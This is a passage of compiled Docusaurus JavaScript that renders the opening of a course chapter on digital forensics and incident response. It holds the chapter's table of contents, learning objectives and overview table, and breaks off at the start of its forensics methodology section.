"use strict";
(globalThis["webpackChunksite"] = globalThis["webpackChunksite"] || []).push([[10153],{

/***/ 56242
(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

// ESM COMPAT FLAG
__webpack_require__.r(__webpack_exports__);

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  assets: () => (/* binding */ assets),
  contentTitle: () => (/* binding */ contentTitle),
  "default": () => (/* binding */ MDXContent),
  frontMatter: () => (/* binding */ frontMatter),
  metadata: () => (/* reexport */ site_docs_courses_cyber_security_08_forensics_ir_md_ae1_namespaceObject),
  toc: () => (/* binding */ toc)
});

;// ./.docusaurus/docusaurus-plugin-content-docs/default/site-docs-courses-cyber-security-08-forensics-ir-md-ae1.json
const site_docs_courses_cyber_security_08_forensics_ir_md_ae1_namespaceObject = /*#__PURE__*/JSON.parse('{"id":"courses/cyber-security/08-forensics-ir","title":"Chapter 8: Forensics & Incident Response","description":"Prereq: Chapter 7 (Cloud & Mobile) → modern forensics must account for cloud and mobile evidence sources.","source":"@site/docs/courses/cyber-security/08-forensics-ir.md","sourceDirName":"courses/cyber-security","slug":"/cyber-security/08-forensics-ir","permalink":"/ai-engineering-journey/cyber-security/08-forensics-ir","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":7,"frontMatter":{"id":"08-forensics-ir","slug":"/cyber-security/08-forensics-ir","title":"Chapter 8: Forensics & Incident Response","sidebar_label":"Chapter 8: Forensics & Incident Response","sidebar_position":7},"sidebar":"course-cyber-security","previous":{"title":"Chapter 7: Cloud & Mobile Security","permalink":"/ai-engineering-journey/courses/cyber-security/cloud-mobile"},"next":{"title":"Chapter 9: Governance, Risk & Compliance (GRC)","permalink":"/ai-engineering-journey/cyber-security/09-grc"}}');
// EXTERNAL MODULE: ./node_modules/react/jsx-runtime.js
var jsx_runtime = __webpack_require__(74848);
// EXTERNAL MODULE: ./node_modules/@mdx-js/react/lib/index.js
var lib = __webpack_require__(28453);
;// ./docs/courses/cyber-security/08-forensics-ir.md


const frontMatter = {
	id: '08-forensics-ir',
	slug: '/cyber-security/08-forensics-ir',
	title: 'Chapter 8: Forensics & Incident Response',
	sidebar_label: 'Chapter 8: Forensics & Incident Response',
	sidebar_position: 7
};
const contentTitle = 'Chapter 8: Forensics & Incident Response';

const assets = {

};



const toc = [{
  "value": "Learning Objectives",
  "id": "learning-objectives",
  "level": 2
}, {
  "value": "Chapter at a Glance",
  "id": "chapter-at-a-glance",
  "level": 3
}, {
  "value": "Table of Contents",
  "id": "table-of-contents",
  "level": 2
}, {
  "value": "1. Digital Forensics Methodology",
  "id": "1-digital-forensics-methodology",
  "level": 2
}, {
  "value": "Phase 1: Identification",
  "id": "phase-1-identification",
  "level": 3
}, {
  "value": "Phase 2: Preservation",
  "id": "phase-2-preservation",
  "level": 3
}, {
  "value": "Phase 3: Collection",
  "id": "phase-3-collection",
  "level": 3
}, {
  "value": "Phase 4: Examination",
  "id": "phase-4-examination",
  "level": 3
}, {
  "value": "Phase 5: Analysis",
  "id": "phase-5-analysis",
  "level": 3
}, {
  "value": "Phase 6: Presentation",
  "id": "phase-6-presentation",
  "level": 3
}, {
  "value": "2. Chain of Custody",
  "id": "2-chain-of-custody",
  "level": 2
}, {
  "value": "Required Components of a Chain of Custody Form",
  "id": "required-components-of-a-chain-of-custody-form",
  "level": 3
}, {
  "value": "Sample Chain of Custody Form (Text Format)",
  "id": "sample-chain-of-custody-form-text-format",
  "level": 3
}, {
  "value": "Legal Standards for Chain of Custody",
  "id": "legal-standards-for-chain-of-custody",
  "level": 3
}, {
  "value": "Chain of Custody Violations That Invalidate Evidence",
  "id": "chain-of-custody-violations-that-invalidate-evidence",
  "level": 3
}, {
  "value": "Edge Cases",
  "id": "edge-cases",
  "level": 3
}, {
  "value": "3. Order of Volatility",
  "id": "3-order-of-volatility",
  "level": 2
}, {
  "value": "The Order of Volatility Table",
  "id": "the-order-of-volatility-table",
  "level": 3
}, {
  "value": "Collection Timing Guidelines",
  "id": "collection-timing-guidelines",
  "level": 3
}, {
  "value": "Anti-Forensics Impact on Volatility",
  "id": "anti-forensics-impact-on-volatility",
  "level": 3
}, {
  "value": "Edge Cases in Order of Volatility",
  "id": "edge-cases-in-order-of-volatility",
  "level": 3
}, {
  "value": "4. Disk Forensics",
  "id": "4-disk-forensics",
  "level": 2
}, {
  "value": "4.1 File System Overview",
  "id": "41-file-system-overview",
  "level": 3
}, {
  "value": "NTFS (New Technology File System)",
  "id": "ntfs-new-technology-file-system",
  "level": 4
}, {
  "value": "FAT (File Allocation Table)",
  "id": "fat-file-allocation-table",
  "level": 4
}, {
  "value": "ext4 (Fourth Extended File System)",
  "id": "ext4-fourth-extended-file-system",
  "level": 4
}, {
  "value": "4.2 Master File Table (MFT) Deep Dive",
  "id": "42-master-file-table-mft-deep-dive",
  "level": 3
}, {
  "value": "4.3 Analyzing MFT for Forensic Evidence",
  "id": "43-analyzing-mft-for-forensic-evidence",
  "level": 3
}, {
  "value": "4.4 Deleted File Recovery",
  "id": "44-deleted-file-recovery",
  "level": 3
}, {
  "value": "4.5 File Carving",
  "id": "45-file-carving",
  "level": 3
}, {
  "value": "4.6 SSD and TRIM Considerations",
  "id": "46-ssd-and-trim-considerations",
  "level": 3
}, {
  "value": "4.7 Data Recovery Tools Comparison",
  "id": "47-data-recovery-tools-comparison",
  "level": 3
}, {
  "value": "4.8 Disk Forensics Edge Cases",
  "id": "48-disk-forensics-edge-cases",
  "level": 3
}, {
  "value": "5. Memory Forensics",
  "id": "5-memory-forensics",
  "level": 2
}, {
  "value": "5.1 Why Memory Forensics Matters",
  "id": "51-why-memory-forensics-matters",
  "level": 3
}, {
  "value": "5.2 Memory Acquisition Methods",
  "id": "52-memory-acquisition-methods",
  "level": 3
}, {
  "value": "Windows Memory Acquisition",
  "id": "windows-memory-acquisition",
  "level": 4
}, {
  "value": "Linux Memory Acquisition",
  "id": "linux-memory-acquisition",
  "level": 4
}, {
  "value": "macOS Memory Acquisition",
  "id": "macos-memory-acquisition",
  "level": 4
}, {
  "value": "Virtual Machine Memory Acquisition",
  "id": "virtual-machine-memory-acquisition",
  "level": 4
}, {
  "value": "5.3 Volatility 3 → Memory Analysis",
  "id": "53-volatility-3--memory-analysis",
  "level": 3
}, {
  "value": "Installation",
  "id": "installation",
  "level": 4
}, {
  "value": "Windows Memory Analysis with Volatility 3",
  "id": "windows-memory-analysis-with-volatility-3",
  "level": 4
}, {
  "value": "1. Identify the Operating System and Profile",
  "id": "1-identify-the-operating-system-and-profile",
  "level": 5
}, {
  "value": "2. List Running Processes",
  "id": "2-list-running-processes",
  "level": 5
}, {
  "value": "3. Examine Process Command Lines",
  "id": "3-examine-process-command-lines",
  "level": 5
}, {
  "value": "4. List Network Connections",
  "id": "4-list-network-connections",
  "level": 5
}, {
  "value": "5. List Loaded DLLs for a Specific Process",
  "id": "5-list-loaded-dlls-for-a-specific-process",
  "level": 5
}, {
  "value": "6. Detect Code Injection",
  "id": "6-detect-code-injection",
  "level": 5
}, {
  "value": "7. Scan for Malware Signatures (YARA within Volatility)",
  "id": "7-scan-for-malware-signatures-yara-within-volatility",
  "level": 5
}, {
  "value": "8. Dump Process for Further Analysis",
  "id": "8-dump-process-for-further-analysis",
  "level": 5
}, {
  "value": "9. Registry Analysis from Memory",
  "id": "9-registry-analysis-from-memory",
  "level": 5
}, {
  "value": "10. Additional Volatility 3 Plugins",
  "id": "10-additional-volatility-3-plugins",
  "level": 5
}, {
  "value": "5.4 Analyzing Specific Malware Artifacts in Memory",
  "id": "54-analyzing-specific-malware-artifacts-in-memory",
  "level": 3
}, {
  "value": "Cobalt Strike Detection",
  "id": "cobalt-strike-detection",
  "level": 4
}, {
  "value": "Mimikatz Detection",
  "id": "mimikatz-detection",
  "level": 4
}, {
  "value": "Metasploit/Meterpreter Detection",
  "id": "metasploitmeterpreter-detection",
  "level": 4
}, {
  "value": "5.5 Memory Forensics Challenges and Anti-Forensics",
  "id": "55-memory-forensics-challenges-and-anti-forensics",
  "level": 3
}, {
  "value": "5.6 Memory Forensics → Complexity &amp; Performance",
  "id": "56-memory-forensics--complexity--performance",
  "level": 3
}, {
  "value": "6. Network Forensics",
  "id": "6-network-forensics",
  "level": 2
}, {
  "value": "6.1 PCAP Analysis Fundamentals",
  "id": "61-pcap-analysis-fundamentals",
  "level": 3
}, {
  "value": "6.2 Wireshark Analysis",
  "id": "62-wireshark-analysis",
  "level": 3
}, {
  "value": "Capturing Traffic",
  "id": "capturing-traffic",
  "level": 4
}, {
  "value": "Key Wireshark Display Filters",
  "id": "key-wireshark-display-filters",
  "level": 4
}, {
  "value": "Following TCP Streams",
  "id": "following-tcp-streams",
  "level": 4
}, {
  "value": "Extracting Files from HTTP Traffic",
  "id": "extracting-files-from-http-traffic",
  "level": 4
}, {
  "value": "Detecting Malware C2 with Wireshark",
  "id": "detecting-malware-c2-with-wireshark",
  "level": 4
}, {
  "value": "6.3 Zeek (Bro) Analysis",
  "id": "63-zeek-bro-analysis",
  "level": 3
}, {
  "value": "Log Generation",
  "id": "log-generation",
  "level": 4
}, {
  "value": "conn.log Analysis",
  "id": "connlog-analysis",
  "level": 4
}, {
  "value": "dns.log Analysis",
  "id": "dnslog-analysis",
  "level": 4
}, {
  "value": "http.log Analysis",
  "id": "httplog-analysis",
  "level": 4
}, {
  "value": "Detecting Beaconing with Zeek",
  "id": "detecting-beaconing-with-zeek",
  "level": 4
}, {
  "value": "Extracting Files with Zeek",
  "id": "extracting-files-with-zeek",
  "level": 4
}, {
  "value": "6.4 Zeek Scripting for Custom Detection",
  "id": "64-zeek-scripting-for-custom-detection",
  "level": 3
}, {
  "value": "6.5 Network Forensics → Complexity and Performance",
  "id": "65-network-forensics--complexity-and-performance",
  "level": 3
}, {
  "value": "7. Mobile Forensics",
  "id": "7-mobile-forensics",
  "level": 2
}, {
  "value": "7.1 Mobile Forensics Acquisition Types",
  "id": "71-mobile-forensics-acquisition-types",
  "level": 3
}, {
  "value": "7.2 Android Forensics",
  "id": "72-android-forensics",
  "level": 3
}, {
  "value": "Android Acquisition Methods",
  "id": "android-acquisition-methods",
  "level": 4
}, {
  "value": "Android Forensic Artifacts",
  "id": "android-forensic-artifacts",
  "level": 4
}, {
  "value": "Android File System",
  "id": "android-file-system",
  "level": 4
}, {
  "value": "Android Lock Screen Bypass",
  "id": "android-lock-screen-bypass",
  "level": 4
}, {
  "value": "7.3 iOS Forensics",
  "id": "73-ios-forensics",
  "level": 3
}, {
  "value": "iOS Acquisition Methods",
  "id": "ios-acquisition-methods",
  "level": 4
}, {
  "value": "iOS Forensic Artifacts",
  "id": "ios-forensic-artifacts",
  "level": 4
}, {
  "value": "iOS Encryption Considerations",
  "id": "ios-encryption-considerations",
  "level": 4
}, {
  "value": "7.4 Mobile Forensics → Key Challenges",
  "id": "74-mobile-forensics--key-challenges",
  "level": 3
}, {
  "value": "7.5 Mobile Forensics Tools Comparison",
  "id": "75-mobile-forensics-tools-comparison",
  "level": 3
}, {
  "value": "7.6 Mobile Forensics Workflow",
  "id": "76-mobile-forensics-workflow",
  "level": 3
}, {
  "value": "8. Cloud Forensics",
  "id": "8-cloud-forensics",
  "level": 2
}, {
  "value": "8.1 Cloud Forensics Challenges",
  "id": "81-cloud-forensics-challenges",
  "level": 3
}, {
  "value": "8.2 AWS Forensics",
  "id": "82-aws-forensics",
  "level": 3
}, {
  "value": "Evidence Collection",
  "id": "evidence-collection",
  "level": 4
}, {
  "value": "AWS Forensic Artifacts",
  "id": "aws-forensic-artifacts",
  "level": 4
}, {
  "value": "8.3 Azure Forensics",
  "id": "83-azure-forensics",
  "level": 3
}, {
  "value": "8.4 GCP Forensics",
  "id": "84-gcp-forensics",
  "level": 3
}, {
  "value": "8.5 Cloud Forensic Workflow",
  "id": "85-cloud-forensic-workflow",
  "level": 3
}, {
  "value": "8.6 Container Forensics (Docker/Kubernetes)",
  "id": "86-container-forensics-dockerkubernetes",
  "level": 3
}, {
  "value": "9. Incident Response Lifecycle (NIST SP 800-61)",
  "id": "9-incident-response-lifecycle-nist-sp-800-61",
  "level": 2
}, {
  "value": "9.1 The Four Phases",
  "id": "91-the-four-phases",
  "level": 3
}, {
  "value": "Phase 1: Preparation",
  "id": "phase-1-preparation",
  "level": 4
}, {
  "value": "Phase 2: Detection &amp; Analysis",
  "id": "phase-2-detection--analysis",
  "level": 4
}, {
  "value": "Phase 3: Containment, Eradication &amp; Recovery",
  "id": "phase-3-containment-eradication--recovery",
  "level": 4
}, {
  "value": "Phase 4: Post-Incident Activity",
  "id": "phase-4-post-incident-activity",
  "level": 4
}, {
  "value": "9.2 SOC Operations",
  "id": "92-soc-operations",
  "level": 3
}, {
  "value": "SOC Tier Model",
  "id": "soc-tier-model",
  "level": 4
}, {
  "value": "SOC Metrics",
  "id": "soc-metrics",
  "level": 4
}, {
  "value": "9.3 SIEM vs SOAR vs XDR",
  "id": "93-siem-vs-soar-vs-xdr",
  "level": 3
}, {
  "value": "10. Threat Hunting &amp; IOC Extraction",
  "id": "10-threat-hunting--ioc-extraction",
  "level": 2
}, {
  "value": "10.1 Threat Hunting Methodology",
  "id": "101-threat-hunting-methodology",
  "level": 3
}, {
  "value": "10.2 YARA Rule Writing for Malware Detection",
  "id": "102-yara-rule-writing-for-malware-detection",
  "level": 3
}, {
  "value": "10.3 IOC Extraction",
  "id": "103-ioc-extraction",
  "level": 3
}, {
  "value": "IOC Types",
  "id": "ioc-types",
  "level": 4
}, {
  "value": "IOC Extraction Commands",
  "id": "ioc-extraction-commands",
  "level": 4
}, {
  "value": "IOC Sharing Formats (STIX/TAXII)",
  "id": "ioc-sharing-formats-stixtaxii",
  "level": 4
}, {
  "value": "10.4 Plaso (log2timeline) → Timeline Creation",
  "id": "104-plaso-log2timeline--timeline-creation",
  "level": 3
}, {
  "value": "10.5 RegRipper → Registry Analysis",
  "id": "105-regripper--registry-analysis",
  "level": 3
}, {
  "value": "10.6 Windows Event Log Analysis",
  "id": "106-windows-event-log-analysis",
  "level": 3
}, {
  "value": "10.7 MFTECmd → MFT Parsing",
  "id": "107-mftecmd--mft-parsing",
  "level": 3
}, {
  "value": "10.8 Incident Response Playbooks",
  "id": "108-incident-response-playbooks",
  "level": 3
}, {
  "value": "10.9 Incident Severity Classification",
  "id": "109-incident-severity-classification",
  "level": 3
}, {
  "value": "11. Practical Examples → Full Tool Walkthroughs",
  "id": "11-practical-examples--full-tool-walkthroughs",
  "level": 2
}, {
  "value": "11.1 FTK Imager / dd → Disk Image Acquisition",
  "id": "111-ftk-imager--dd--disk-image-acquisition",
  "level": 3
}, {
  "value": "11.2 Autopsy / Sleuth Kit → File System Analysis and Recovery",
  "id": "112-autopsy--sleuth-kit--file-system-analysis-and-recovery",
  "level": 3
}, {
  "value": "11.3 Volatility 3 → Full Memory Analysis Walkthrough",
  "id": "113-volatility-3--full-memory-analysis-walkthrough",
  "level": 3
}, {
  "value": "11.4 Wireshark → Network Traffic Analysis Walkthrough",
  "id": "114-wireshark--network-traffic-analysis-walkthrough",
  "level": 3
}, {
  "value": "11.5 Zeek → Network Log Generation and Beaconing Detection",
  "id": "115-zeek--network-log-generation-and-beaconing-detection",
  "level": 3
}, {
  "value": "12. Case Studies",
  "id": "12-case-studies",
  "level": 2
}, {
  "value": "12.1 Sony Pictures Entertainment 2014",
  "id": "121-sony-pictures-entertainment-2014",
  "level": 3
}, {
  "value": "12.2 Colonial Pipeline 2021",
  "id": "122-colonial-pipeline-2021",
  "level": 3
}, {
  "value": "12.3 Uber 2022",
  "id": "123-uber-2022",
  "level": 3
}, {
  "value": "12.4 Target 2013",
  "id": "124-target-2013",
  "level": 3
}, {
  "value": "13. Comparison Tables",
  "id": "13-comparison-tables",
  "level": 2
}, {
  "value": "13.1 Forensic Process Phases Comparison",
  "id": "131-forensic-process-phases-comparison",
  "level": 3
}, {
  "value": "13.2 Disk vs Memory vs Network vs Mobile Forensics Comparison",
  "id": "132-disk-vs-memory-vs-network-vs-mobile-forensics-comparison",
  "level": 3
}, {
  "value": "13.3 IR Lifecycle Crosswalk (NIST SP 800-61)",
  "id": "133-ir-lifecycle-crosswalk-nist-sp-800-61",
  "level": 3
}, {
  "value": "13.4 SIEM vs SOAR vs XDR Comparison",
  "id": "134-siem-vs-soar-vs-xdr-comparison",
  "level": 3
}, {
  "value": "13.5 Threat Hunting Methodology Comparison",
  "id": "135-threat-hunting-methodology-comparison",
  "level": 3
}, {
  "value": "14. Interview Corner",
  "id": "14-interview-corner",
  "level": 2
}, {
  "value": "Q1: What is the order of volatility and why is it important?",
  "id": "q1-what-is-the-order-of-volatility-and-why-is-it-important",
  "level": 3
}, {
  "value": "Q2: What are the key differences between disk forensics and memory forensics?",
  "id": "q2-what-are-the-key-differences-between-disk-forensics-and-memory-forensics",
  "level": 3
}, {
  "value": "Q3: Explain chain of custody and what happens if it is broken.",
  "id": "q3-explain-chain-of-custody-and-what-happens-if-it-is-broken",
  "level": 3
}, {
  "value": "Q4: How do you detect a rootkit during memory forensics?",
  "id": "q4-how-do-you-detect-a-rootkit-during-memory-forensics",
  "level": 3
}, {
  "value": "Q5: What is file carving and when would you use it?",
  "id": "q5-what-is-file-carving-and-when-would-you-use-it",
  "level": 3
}, {
  "value": "Q6: What are the four phases of the NIST Incident Response lifecycle?",
  "id": "q6-what-are-the-four-phases-of-the-nist-incident-response-lifecycle",
  "level": 3
}, {
  "value": "Q7: What is the difference between MTTD, MTTR, and MTTC?",
  "id": "q7-what-is-the-difference-between-mttd-mttr-and-mttc",
  "level": 3
}, {
  "value": "Q8: How would you investigate a potential data exfiltration incident?",
  "id": "q8-how-would-you-investigate-a-potential-data-exfiltration-incident",
  "level": 3
}, {
  "value": "Q9: Explain how YARA rules work and give an example of when you would write one.",
  "id": "q9-explain-how-yara-rules-work-and-give-an-example-of-when-you-would-write-one",
  "level": 3
}, {
  "value": "Q10: What is the difference between logical and physical mobile acquisition?",
  "id": "q10-what-is-the-difference-between-logical-and-physical-mobile-acquisition",
  "level": 3
}, {
  "value": "Q11: Describe a time when the chain of custody was crucial in a digital forensics case.",
  "id": "q11-describe-a-time-when-the-chain-of-custody-was-crucial-in-a-digital-forensics-case",
  "level": 3
}, {
  "value": "Q12: What is the significance of the MFT in NTFS forensics?",
  "id": "q12-what-is-the-significance-of-the-mft-in-ntfs-forensics",
  "level": 3
}, {
  "value": "15. Applications in Real Systems",
  "id": "15-applications-in-real-systems",
  "level": 2
}, {
  "value": "Enterprise SOC Architecture",
  "id": "enterprise-soc-architecture",
  "level": 3
}, {
  "value": "Forensics in Cloud-Native Environments",
  "id": "forensics-in-cloud-native-environments",
  "level": 3
}, {
  "value": "Automated Forensics → DFIR Orchestration",
  "id": "automated-forensics--dfir-orchestration",
  "level": 3
}, {
  "value": "Compliance Frameworks Referencing Forensics &amp; IR",
  "id": "compliance-frameworks-referencing-forensics--ir",
  "level": 3
}, {
  "value": "Career Paths in Forensics &amp; Incident Response",
  "id": "career-paths-in-forensics--incident-response",
  "level": 3
}, {
  "value": "Practical Takeaways",
  "id": "practical-takeaways",
  "level": 2
}, {
  "value": "Summary",
  "id": "summary",
  "level": 2
}, {
  "value": "TypeScript Implementations",
  "id": "typescript-implementations",
  "level": 2
}, {
  "value": "Forensic Timeline Analyzer",
  "id": "forensic-timeline-analyzer",
  "level": 3
}, {
  "value": "Hash Set Validator",
  "id": "hash-set-validator",
  "level": 3
}, {
  "value": "Mermaid Diagrams",
  "id": "mermaid-diagrams",
  "level": 2
}, {
  "value": "Incident Response Lifecycle (NIST SP 800-61)",
  "id": "incident-response-lifecycle-nist-sp-800-61",
  "level": 3
}, {
  "value": "Chain of Custody Workflow",
  "id": "chain-of-custody-workflow",
  "level": 3
}, {
  "value": "Chapter Quiz",
  "id": "chapter-quiz",
  "level": 2
}, {
  "value": "Exercises",
  "id": "exercises",
  "level": 2
}, {
  "value": "Review Questions",
  "id": "review-questions",
  "level": 3
}, {
  "value": "Practical Exercises",
  "id": "practical-exercises",
  "level": 3
}, {
  "value": "Challenge Problems",
  "id": "challenge-problems",
  "level": 3
}];
function _createMdxContent(props) {
  const _components = {
    annotation: "annotation",
    blockquote: "blockquote",
    code: "code",
    details: "details",
    h1: "h1",
    h2: "h2",
    h3: "h3",
    h4: "h4",
    h5: "h5",
    header: "header",
    hr: "hr",
    li: "li",
    math: "math",
    mi: "mi",
    mn: "mn",
    mo: "mo",
    mrow: "mrow",
    msub: "msub",
    ol: "ol",
    p: "p",
    pre: "pre",
    semantics: "semantics",
    span: "span",
    strong: "strong",
    summary: "summary",
    table: "table",
    tbody: "tbody",
    td: "td",
    th: "th",
    thead: "thead",
    tr: "tr",
    ul: "ul",
    ...(0,lib/* useMDXComponents */.R)(),
    ...props.components
  };
  return (0,jsx_runtime.jsxs)(jsx_runtime.Fragment, {
    children: [(0,jsx_runtime.jsx)(_components.header, {
      children: (0,jsx_runtime.jsx)(_components.h1, {
        id: "chapter-8-forensics--incident-response",
        children: "Chapter 8: Forensics & Incident Response"
      })
    }), "\n", (0,jsx_runtime.jsxs)(_components.blockquote, {
      children: ["\n", (0,jsx_runtime.jsxs)(_components.p, {
        children: [(0,jsx_runtime.jsx)(_components.strong, {
          children: "Prereq:"
        }), " Chapter 7 (Cloud & Mobile) → modern forensics must account for cloud and mobile evidence sources.\n", (0,jsx_runtime.jsx)(_components.strong, {
          children: "Next:"
        }), " Chapter 9 (GRC) → incident findings feed into governance, risk, and compliance processes."]
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "learning-objectives",
      children: "Learning Objectives"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ul, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Define the four phases of the NIST SP 800-61 Incident Response lifecycle"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Master the six-phase digital forensics methodology (Identification → Preservation → Collection → Examination → Analysis → Presentation)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Understand chain of custody documentation and legal admissibility requirements"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Apply the Order of Volatility to prioritize evidence collection in live environments"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Execute disk forensics analysis on NTFS, FAT, and ext4 file systems including MFT parsing, file carving, and deleted file recovery"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Perform memory forensics using Volatility 3 to extract processes, network connections, DLLs, and injected code"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Conduct network forensics with Wireshark and Zeek to identify C2 traffic and extract artifacts"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Understand mobile forensics acquisition techniques for Android and iOS"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Implement cloud forensics evidence collection in AWS, Azure, and GCP"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Build and execute incident response playbooks with SIEM/SOAR integration"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Write YARA rules for malware detection"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Analyze four major real-world case studies (Sony 2014, Colonial Pipeline 2021, Uber 2022, Target 2013)"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.h3, {
      id: "chapter-at-a-glance",
      children: "Chapter at a Glance"
    }), "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n", (0,jsx_runtime.jsxs)(_components.table, {
      children: [(0,jsx_runtime.jsx)(_components.thead, {
        children: (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.th, {
            children: "Section"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Key Concept"
          }), (0,jsx_runtime.jsx)(_components.th, {
            children: "Why It Matters"
          })]
        })
      }), (0,jsx_runtime.jsxs)(_components.tbody, {
        children: [(0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "IR Lifecycle"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Prep → Detect → Contain → Eradicate → Recover → Post-Incident"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Structured approach to handling breaches"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Digital Forensics Methodology"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "ID → Preserve → Collect → Examine → Analyze → Present"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Legally defensible evidence process"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Order of Volatility"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Collect most volatile first"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Preserve the most fragile evidence before it disappears"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Disk Forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "MFT, File Carving, Slack Space"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Recover evidence from storage media"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Memory Forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "RAM Analysis with Volatility 3"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Find rootkits, injected code, fileless malware"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Network Forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "PCAP, Wireshark, Zeek"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Identify C2 communication and data exfiltration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Mobile Forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Android/iOS Acquisition"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Extract evidence from modern smartphones"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Cloud Forensics"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "AWS/Azure/GCP Log Collection"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Evidence collection in ephemeral cloud environments"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "SIEM / SOAR / XDR"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Splunk, ELK, Automation"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Centralized detection and response orchestration"
          })]
        }), (0,jsx_runtime.jsxs)(_components.tr, {
          children: [(0,jsx_runtime.jsx)(_components.td, {
            children: "Threat Hunting"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "YARA, IOC, Hypothesis-driven"
          }), (0,jsx_runtime.jsx)(_components.td, {
            children: "Proactive threat discovery before detection"
          })]
        })]
      })]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "table-of-contents",
      children: "Table of Contents"
    }), "\n", (0,jsx_runtime.jsxs)(_components.ol, {
      children: ["\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Digital Forensics Methodology"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Chain of Custody"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Order of Volatility"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Disk Forensics"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Memory Forensics"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Network Forensics"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Mobile Forensics"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Cloud Forensics"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Incident Response Lifecycle (NIST SP 800-61)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "SOC Operations & SIEM/SOAR/XDR"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Threat Hunting & IOC Extraction"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Playbooks & Automation"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Practical Examples (Tool Commands)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Case Studies"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Comparison Tables"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Interview Corner (10+ Q&As)"
      }), "\n", (0,jsx_runtime.jsx)(_components.li, {
        children: "Applications in Real Systems"
      }), "\n"]
    }), "\n", (0,jsx_runtime.jsx)(_components.hr, {}), "\n", (0,jsx_runtime.jsx)(_components.h2, {
      id: "1-digital-forensics-methodology",
      children: "1. Digital Forensics Methodology"
    }), "\n", (0,jsx_runtime.jsx)(_components.p, {
      children: "Digital forensics is the application of computer science and investigative procedures to examine digital evidence in a manner that is legally admissible. The methodology follows six distinct phases, each with specific goals, tools, and documentation requirements."
    }), "\n", (0,jsx_runtime.jsxs)(_components.p, {
